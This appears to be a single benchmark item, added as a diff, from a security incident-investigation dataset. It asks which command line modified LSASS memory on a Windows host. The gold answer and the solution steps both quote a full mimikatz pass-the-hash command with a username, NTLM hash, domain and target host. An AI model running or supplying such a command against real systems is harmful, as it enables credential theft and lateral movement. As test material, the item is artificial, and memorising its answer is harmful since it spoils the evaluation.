@@ -1,0 +1,35 @@
+{
+  "task_id": "incident_5_test_q022",
+  "incident": "incident_5",
+  "split": "test",
+  "context": "The identified suspicious activity on host `vnevado-win10r` involved attempts to access a Primary Refresh Token (PRT) tied to Azure AD authentication. The incident's timeline saw a triggering alert for a possible PRT access attempt using the process `browsercore.exe`.",
+  "question": "What is the command line of the process that modified the LSASS process memory?",
+  "gold_answer": "2020__2024-06-20t09:03:47.538167z__\"mimikatz.exe\" privilege::debug \"sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:..\\notepad.exe //vnevado-jump cmd.exe\"",
+  "solution_steps": [
+    "There was a possible attempt to access the Primary Refresh Token (PRT) using the process `browsercore.exe`.",
+    "The user with AadUserId `1d94aaf6-efe6-4e76-ad56-ffd7d1257bc1` was involved in a possible attempt to access the Primary Refresh Token (PRT).",
+    "The LSASS process memory was modified using the command line `mimikatz.exe privilege::debug sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:..\notepad.exe //vnevado-jump cmd.exe` at `2024-06-20t09:03:47.538167z`, with Process ID `2020`."
+  ],
+  "metadata": {
+    "start_alert": 71,
+    "end_alert": 115,
+    "start_entities": [
+      1,
+      2,
+      3,
+      64,
+      65,
+      72
+    ],
+    "end_entities": [
+      32
+    ],
+    "shortest_alert_path": [
+      71,
+      40,
+      36,
+      18,
+      115
+    ]
+  }
+}
